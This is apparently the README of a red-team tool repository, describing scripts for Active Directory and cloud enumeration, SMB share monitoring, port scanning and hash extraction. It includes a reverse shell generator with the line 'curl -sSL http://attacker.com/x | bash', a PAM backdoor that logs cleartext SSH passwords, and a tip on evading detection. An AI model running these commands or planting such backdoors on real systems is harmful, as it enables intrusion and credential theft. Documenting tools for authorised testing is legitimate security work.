# Tools

## [CertipyPermParse.py](./CertipyPermParse.py) - Parse Certipy JSON Output for ACL Anomalies

This tool parses Certipy JSON output to identify anomalies in Access Control Lists (ACLs), helping you hunt for potential targets in a Windows Active Directory environment. By analyzing certificate templates, permissions, and vulnerabilities, the tool filters out standard groups and highlights unusual access permissions that could indicate misconfigurations or attack vectors.

#### Features:
- Parses JSON output from Certipy to identify anomalies in ACLs.
- Filters out known administrative groups such as "Domain Admins" and "Enterprise Admins" to focus on unusual principals.
- Detects potential certificate vulnerabilities and permissions issues, such as unauthorized write access.
- Supports exporting results to CSV for easy analysis.
- Option to check only active certificates.
- Allows for additional exclusions of specific principals.

#### Usage:
```bash
python3 CertipyPermParse.py <file_path> [--csv <output_file>] [--exclude <principal1> <principal2>] [--active-only]
```

- `<file_path>`: Path to the Certipy JSON output file.
- `--csv`: (Optional) Path to save the parsed results as a CSV file.
- `--exclude`: (Optional) Additional principals to exclude from the results.
- `--active-only`: (Optional) Check only active certificate templates.

```bash
python3 CertipyPermParse.py certipy_output.json --csv results.csv --exclude "Test User" --active-only
```
## [TokenToWonderland.ps1](./TokenToWonderland.ps1) - Generate Access Tokens for Microsoft Graph API by specifiying ClientIDs

This script uses a refresh token and client ID to request new access tokens with new scopes based on the clientID for the Microsoft Graph API.

#### Usage:
```powershell
.\TokenToWonderland.ps1 -domain <tenant_domain> -refreshToken <refresh_token> -clientId <client_id> [-resource <resource_url>] [-PassTokens] [-OutputColor <color>]
```

- `<tenant_domain>`: Domain of the Azure AD tenant (e.g., contoso.com).
- `<refresh_token>`: Refresh token to authenticate and request new tokens.
- `<client_id>`: Client ID of the application for the desired permissions.
- `<resource_url>`: (Optional) Target resource (default: `https://graph.microsoft.com/`).
- `-PassTokens`: (Optional) Save tokens to the `$tokens` variable for future use.
- `-OutputColor`: (Optional) Customize output text color (e.g., `Red`, `Yellow`).

#### Example:
```powershell
.\TokenToWonderland.ps1 -domain "contoso.com" -refreshToken "your_refresh_token" -clientId "27922004-5251-4030-b22d-91ecd9a37ea4" -PassTokens
```
## [TansferSnatch.ps1](TransferSnatch.ps1) - SMB Share Monitoring

A lot of companies still use open SMB shares for file transfers, which inadvertently expose sensitive information. Some of these transfer shares are never cleaned up, leaving sensitive files indefinitely accessible, while others are cleared every night, every couple of hours, or even within seconds after files are transferred.

This script is designed to monitor such SMB shares for new or modified files in real time. It helps red team operators detect, download, and analyze files—even if they exist on the share for only a brief moment. 

### Usage
```powershell
.\TransferSnatch.ps1 -SMBSharePath <UNC_Path> -DownloadDirectory <Local_Directory> [-IntervalInSeconds <Seconds>] [-MaxFileSizeMB <Size>] [-MaxDepth <Depth>] [-FileTypes <Patterns>] [-SensitiveStrings <Strings>] [-ProcessExistingFiles] [-ExcludeExtensions <Extensions>] [-LogFile <File_Path>]
```

### Notes
- Ensure the script has appropriate permissions to access the SMB share and download files.
- For extended engagements, consider increasing the interval (`-IntervalInSeconds`) to avoid detection.
- Sensitive string searches are basic and do not account for advanced patterns or encodings; consider extending the functionality for specific engagements. 


## [adminer.sh](./adminer.sh) - Secure Neo4j Password Wrapper for AD-miner

`adminer.sh` is a stupid wrapper. This script prompts for the password in a hidden input, runs AD-miner with the specified domain.

## [arpa.sh](./arpa.sh) - Quick Network Overview and Open Ports Scan

This script can quickly gather a list of connected devices on a host and perform a fast scan for common open ports. It is especially useful in environments with Docker containers or virtualized networks where host discovery is important. The main goal is to curl this script into bash for an immediate overview of active hosts and their services.

The script leverages tools like `ip`, `arp`, `nc`, `telnet`, and `awk` to identify available hosts and check for open ports on a predefined list of common service ports.

#### Features:
- **Network Interface Discovery**: Lists all network interfaces and their associated IP addresses.
- **Connected Hosts Detection via ARP**: Uses ARP to detect devices currently connected to the local network and scans for open ports on discovered hosts.
- **CIDR Range Support**: Scans multiple IP addresses within a specified CIDR range (e.g., `192.168.1.0/24`), automatically expanding the range and checking each host for common open ports.
- **Single IP Scanning**: If a specific IP is provided, the script will scan that IP for open ports instead of scanning the network.
- **Port Scanning**: Scans common service ports on either a discovered host or a provided IP, using `nc` (Netcat) by default, with fallbacks to `telnet` or `/dev/tcp`.
- **Fallbacks**: If `nc` is unavailable, it falls back to `telnet` or `/dev/tcp` to ensure port scanning works on most systems.

#### Usage:
- **Scan the Local Network**: When no arguments are passed, the script performs ARP-based discovery of connected hosts and scans them for open ports.
- **Scan a Specific IP**: Provide a single IP as an argument to scan that host for common open ports.
- **Scan a CIDR Range**: Provide a CIDR range (e.g., `192.168.1.0/24`) to scan multiple IPs within the range.

#### Example:
```bash
curl -s http://<script_url>.com/arpa.sh | bash
# Scan a specific IP
bash arpa.sh 192.168.1.10
# Scan a CIDR range
bash arpa.sh 192.168.1.0/24
```

## [aws_enum.sh](./aws_enum.sh) - Quick Overview of AWS Resources

This script automates the process of fetching details about AWS resources using a specified AWS profile. It logs the output to a file and retrieves key information like EC2 instances, S3 buckets, VPCs, IAM users, and more. It’s useful for getting a quick overview of the AWS environment, especially during audits or troubleshooting.

#### Features:
- **AWS Profile Support**: Allows specifying an AWS profile to fetch details.
- **Detailed Logging**: Logs all fetched data into a file for easy review.
- **Resource fetching**: Retrieves information about key AWS resources such as:
  - EC2 instances
  - S3 buckets
  - RDS instances
  - VPCs
  - Security groups
  - IAM users and roles
- **Error Handling**: Captures and logs errors during the data fetching process.

#### Usage:
```bash
aws_enum.sh <aws-profile>
```

## [clockskewer.sh](./clockskewer.sh) - Synchronize System Time with a Remote Host

`clockskewer.sh` is a Bash script designed to synchronize your system's time with that of a remote host or reset it to your system's timezone. It supports synchronization via NTP, `rdate`, or HTTP(S), and manages NTP synchronization services to prevent conflicts.

#### Usage:

```bash
sudo bash clockskewer.sh <hostname_or_ip|reset>
```

- **Synchronize time with a remote host:**

  ```bash
  sudo bash clockskewer.sh example.com
  ```

- **Reset time to your system's timezone and re-enable NTP synchronization:**

  ```bash
  sudo bash clockskewer.sh reset
  ```

#### Features:

- **Time Synchronization Methods:**
  - **NTP (`ntpdate`):** Syncs time using NTP protocol if `ntpdate` is available.
  - **`rdate`:** Uses `rdate` if `ntpdate` is not available.
  - **HTTP(S):** Retrieves date from HTTP headers if neither `ntpdate` nor `rdate` is available.
  
- **NTP Synchronization Management:**
  - Disables NTP synchronization before setting the time to prevent it from overwriting changes.
  - Does not re-enable NTP synchronization when syncing with a remote host (unless `reset` is used).
  
- **Reset Functionality:**
  - Resets the system time to match your system's timezone.
  - Re-enables NTP synchronization to keep your system time accurate.



## [dns-dump.py](./dns-dump.py) - Resolve Domains and Dump DNS Records

`dns-dump.py` is a Python script that resolves domain names to their corresponding IP addresses and, optionally, dumps all DNS records for each domain. The script supports saving the results in JSON format for easy review and analysis.

#### Usage:
```bash
python3 dns-dump.py <file> [--json] [--dump]
```

## [dns-query.py](./dns-query.py)

Its `dig` ok?

## [hosts.py](./hosts.py) - Manage /etc/hosts File Quickly and Efficiently

`hosts.py` is one of my most used tools for quickly interacting with the `/etc/hosts` file. It allows for fast management of host entries, such as adding new IP-to-domain mappings, replacing existing entries (box reset), deleting entries, and listing current hosts. This script is especially helpful when you need to add virtual hosts (vhosts) and provides an efficient way to manage multiple entries without manually editing the file.

#### Features:
- **List entries**: Display all current IP/domain mappings in the `/etc/hosts` file.
- **Add entries**: Add new IP/domain entries or append subdomains to existing IP addresses.
- **Replace entries**: Replace the IP address for a specific domain quickly.
- **Delete entries**: Remove an entire IP entry or just a specific domain from an IP address.

#### Usage:
```bash
./hosts.py list              # List all entries
./hosts.py add <ip> <domain> # Add a new entry
./hosts.py add <vhost>.<domain> # Add a vhost to an already existing entry
./hosts.py replace <new_ip> <domain> # Replace an existing entry's IP
./hosts.py rm                # Delete an entry or specific domain
```

## [image_converter.py](./image_converter.py) - Convert Images to Different File Types for File Upload Testing

`image-converter.py` is a small script that quickly converts an image into various file formats, making it ideal for testing file upload vulnerabilities. The script helps to generate multiple versions of an image to test for bypass file upload restrictions or filters.

#### Usage:
```bash
python3 image-converter.py <image_file> <output_directory>
```

## [ipconv.py](./ipconv.py) - Convert IP Addresses to Various Formats to Bypass Restrictions

`ipconv.py` is a Python script that converts IPv4 addresses into different formats such as decimal, octal, and hexadecimal. These alternate representations of IP addresses can be useful for bypassing certain security restrictions or filters that may not recognize IPs in non-standard formats.

#### Usage:
```bash
python3 ipconv.py <ip_address>
```

## [mssql_ridbrute.py](./mssql_ridbrute.py) - Enumerate Active Directory Accounts via MSSQL RID Brute-Forcing

This tool connects to a Microsoft SQL Server and performs RID (Relative Identifier) brute-forcing to enumerate Active Directory user and group accounts. It leverages special SQL queries to retrieve account information by manipulating SIDs (Security Identifiers), which is particularly useful when you have local access to a database but lack domain user privileges. By exploiting functions like `SUSER_SNAME` and `SUSER_SID`, the script can uncover valid account names associated with specific RIDs in the domain.

This script constructs SIDs by combining the domain SID with incremental RIDs and uses the `SUSER_SNAME` function to resolve them into account names. This method allows for the discovery of user and group accounts in the domain, which can be helpful in limited during offensive assessments, especially when other enumeration methods are restricted.

#### **Usage:**

```bash
┌──(kalikali)-[~/mssql_ridbrute]
└─$ python3 mssql_idbrute.py -h
usage: ridbrute.py [-h] --server SERVER --username USERNAME --password PASSWORD [--database DATABASE] [--port PORT] [--start START] [--end END] [--delay DELAY] [--output OUTPUT] [--output-format {text,csv,json}]

MSSQL RID brute-force script

options:
  -h, --help            show this help message and exit
  --server SERVER, -s SERVER
                        MSSQL server address
  --username USERNAME, -u USERNAME
                        MSSQL username
  --password PASSWORD, -p PASSWORD
                        MSSQL password
  --database DATABASE, -d DATABASE
                        Database to connect to (default: master)
  --port PORT, -P PORT  MSSQL server port (default: 1433)
  --start START         Start of RID range (default: 500)
  --end END             End of RID range (default: 2000)
  --delay DELAY         Delay between requests in seconds (default: 0)
  --output OUTPUT, -o OUTPUT
                        Output file path
  --output-format {text,csv,json}
                        Output format (default: text)
```

#### **Misc:**

- **RID Range:**

  - Common RID values:
    - `500`: Administrator
    - `501`: Guest
    - `512`: Domain Admins group
    - `513`: Domain Users group
    - RIDs for user accounts typically start from `1000` upwards.
  - Adjust the `--start` and `--end` values based on your enumeration needs.

- **SQL Functions Used:**

  - `SUSER_SID('domain\account')`: Returns the SID for the specified account.
  - `SUSER_SNAME(sid)`: Returns the account name associated with the specified SID.




## [namegen.py](./namegen.py) - Generate Variants of Usernames for Enumeration

This tool generates various username variants based on a list of input names. It is especially useful for creating permutations of usernames that can be used during penetration testing. The tool supports generating combinations for both single-word and multi-word names, producing multiple formats such as hyphenated, underscored, and concatenated usernames.

#### Features:
- Generates multiple variants for both single-word and multi-word names.
- Supports variants with hyphens, underscores, dots, and concatenation.
- Saves generated usernames to a `users.generated` file in the current directory.

#### Example:
```bash
┌──(kalikali)-[/tmp/foo]
└─$ echo "Foo Bar" > names.txt 
                                                                                                                                                           
┌──(kalikali)-[/tmp/foo]
└─$ namegen.py names.txt
[*] Names Loaded:
    + Foo Bar
[*] File Saved to: /tmp/foo/users.generated
   
┌──(kalikali)-[/tmp/foo]
└─$ cat users.generated 
Foo-Bar
Foo_Bar
Foo.Bar
Foo Bar
FooBar
FBar
FooB
F-Bar
F_Bar
F.Bar
Foo-B
Foo_B
Foo.B
FB
```

## [ntlm-hasher.py](./ntlm-hasher.py) - Calculate the NTLM Hash of a Password

`ntlm-hasher.py` is a simple Python script used to compute the NTLM hash of a given password.

#### Usage:
```bash
python3 ntlm-hasher.py <password>
```

## [ratelimit_check.py](./ratelimit_check.py) - Check for Rate Limiting on API Endpoints

`ratelimit_check.py` is a tool used to test for rate limiting on URL endpoints, specifically targeting API endpoints. The script sends a specified number of POST requests to a given URL and tracks the responses, allowing you to detect any signs of rate limiting or throttling by monitoring the returned HTTP status codes.

#### Features:
- **API Rate Limiting Detection**: Sends multiple POST requests to an API endpoint to check for rate limits.
- **Customizable Data**: Supports sending data as JSON or form-encoded.
- **Request Customization**: Configure the number of requests to send to the target endpoint.
- **Status Code Analysis**: Counts and displays the frequency of each HTTP status code received, helping identify rate-limiting behavior.
- **Performance Monitoring**: Tracks and reports the total time taken to send all requests.

#### Usage:
```bash
python3 ratelimit_check.py <url> <data> [--content-type json|form] [--num-requests <n>]
```


## [resh.py](./resh.py) - Reliant Reverse Shell Generator

`resh.py` is a Python script that generates a reverse shell script in multiple languages (Python, Perl, Netcat, PHP, Ruby, Lua, etc.) based on the target machine’s available interpreters. The generated reverse shell script can be easily executed by curling the output into bash, making it convenient for quick reverse shell setups during penetration testing.

This tool is not written by me. It's based on old reverse shell generators that you could curl. You can just curl the output into bash to retrieve a reverse shell without worrying about encoding or complex setups.

#### Features:
- **Multi-language reverse shell**: Generates reverse shell commands in multiple languages (Python, Perl, Netcat, PHP, Ruby, Lua), depending on what's available on the target system.
- **Quick reverse shell setup**: The output can be curled directly into bash for quick remote access.
- **Easy customization**: Accepts local host (`lhost`) and local port (`lport`) as inputs, customizing the reverse shell to your setup.

#### Usage:
```bash
python3 resh.py <lhost> <lport> <filename>
```

```bash
# Generate a reverse shell script that connects back to 10.10.10.10 on port 4444
python3 resh.py 10.10.10.10 4444 x

# Curl the generated file and execute it on the target machine
curl -sSL http://attacker.com/x | bash
```

## [routegoesPTR.ps1](./routegoesPTR.ps1) - Reverse DNS Lookup and Network Discovery Tool

`routegoesPTR.ps1` is a PowerShell script designed to assist in network reconnaissance by performing reverse DNS lookups on selected network routes. This tool is particularly useful when you have a VPN connection to a target network and want to discover hostnames and gain insights into the systems accessible via available routes. By mapping IP addresses to hostnames, you can get a better understanding of the network infrastructure and identify potential systems for further exploration.

## Usage

```powershell
.\routegoesPTR.ps1 [-ping]
```
- `-ping` (optional): When specified, the script pings hosts before attempting reverse DNS lookups and only processes hosts that respond.


## [sammy.py](./sammy.py) - Extract NTLM Hashes from Samba's sam.ldb Database

`sammy.py` is a tool to extract NTLM hashes from Samba's `sam.ldb` database. It connects to the database, searches for user objects with `unicodePwd` attributes, and converts these to NTLM-like hashes that can be used for further analysis or cracking.

#### Features:
- Connects to Samba's `sam.ldb` database using the Samba libraries.
- Extracts `unicodePwd` attributes and converts them to NTLM hashes.
- Provides output showing the username and corresponding NTLM hash.

#### Usage:
```bash
python3 sammy.py <ldb_file>
```

## [ssh-pam-backdoor.sh](./ssh-pam-backdoor.sh) - PAM Backdoor for Logging Cleartext SSH Passwords

This script hooks into the PAM stack, logging **cleartext passwords** from successful SSH logins. It modifies the PAM configuration to capture and store credentials in a custom log file.

#### Features:
- **Cleartext Password Logging**: Logs plain text passwords from successful SSH authentications.
- **PAM Integration**: Injects itself into `/etc/pam.d/common-auth` to capture SSH login attempts.
- **Log Storage**: Logs data, including username, password, and remote IP to `/var/log/auth.1.log`.

#### Example Log:
```bash
Thu Oct 19 12:34:56 UTC 2023 akaza, InfinityCaslte123!, From: 201.231.155.21
```


## [subb.py](./subb.py) - Quick V-Host Enumeration and Subdomain Discovery

`subb.py` can quickly find virtual hosts (vhosts) for a given domain by either using a provided wordlist or generating a custom list of keywords using CeWL.

#### Features:
- **Wordlist-based enumeration**: Use a file of potential subdomains to identify valid vhosts.
- **CeWL integration**: Automatically generate custom wordlists by running CeWL on a target URL, useful for vhost enumeration based on content.
- **TLS and port options**: Supports HTTPS or custom ports for flexible vhost discovery.
- **Verbose mode**: Provides detailed information about each request, including headers and response content.
- **Invalid response size filtering**: Allows specification of a response size that should be considered invalid.

#### Usage:
```bash
./subb.py <domain> [subdomain_input] [--tls] [--port <port>] [--verbose] [--max-redirects <n>] [--cewl <url>] [--fs <invalid_size>]
```

- `domain`: The target domain for vhost enumeration.
- `subdomain_input`: A subdomain or a file containing subdomains (optional if using CeWL).
- `--tls`: Use HTTPS instead of HTTP.
- `--port`: Specify a custom port for the requests.
- `--verbose`: Print detailed output of the subdomain responses.
- `--max-redirects`: Set a maximum number of redirects to follow (default is 3).
- `--cewl`: Run CeWL on a given URL to generate a custom list of subdomains.
- `--fs`: Specify a response size that should be considered invalid.



## [url-enum.sh](./url-enum.sh) - Enumerate and Extract URLs from Domains

`url-enum.sh` is a Bash script that enumerates URLs from a list of domains using various tools such as `httpx`, `gospider`, `paramspider`, `gau`, `hakrawler`, and `galer`. It collects URLs from multiple sources, cleans them, and outputs the results into a file for further processing. The extracted URLs can then be used with other scripts, such as `url-parse-js.sh` for additional analysis.

#### Features:
- **URL enumeration**: Extracts URLs from a list of domains using several tools to gather comprehensive results.
- **Cookie-based authentication**: Optionally provide a session cookie for authentication when needed.
- **Multiple sources**: Utilizes `gospider`, `paramspider`, `gau`, `hakrawler`, and `galer` to ensure extensive URL collection.
- **Clean output**: Filters and cleans the extracted URLs, outputting unique results to a file.

#### Usage:
```bash
# Enumerate URLs from domains with session authentication
./url-enum.sh -f domains.txt -c "session_token=abc123"

# Enumerate URLs without authentication
./url-enum.sh -f domains.txt
```


## [url-parse-js.sh](./url-parse-js.sh) - Extract and Process JavaScript URLs from Domains

`url-parse-js.sh` is a Bash script that extracts and processes JavaScript URLs from a list of domains and URLs. The script parses URLs, identifies JavaScript files, and can optionally use a provided cookie for session authentication. It processes the URLs, downloads the source code, and filters out unnecessary responses, such as HTTP 404 and 304 codes.

#### Features:
- **Extract JavaScript URLs**: Parses a list of URLs to find JavaScript files associated with the domains provided.
- **Optional cookie-based authentication**: Allows providing a session cookie for authentication when required.
- **Download source code**: Uses `httpx` to download the JavaScript source code from the URLs, storing it in a specified directory.

#### Usage:
```bash
# Extract and process JavaScript URLs with authentication
./url-parse-js.sh -d domains.txt -u urls.txt -c "session_token=abc123"

# Extract and process JavaScript URLs without authentication
./url-parse-js.sh -d domains.txt -u urls.txt
```

This script is particularly useful when you need to extract and analyze JavaScript files from multiple domains, with or without session-based authentication.







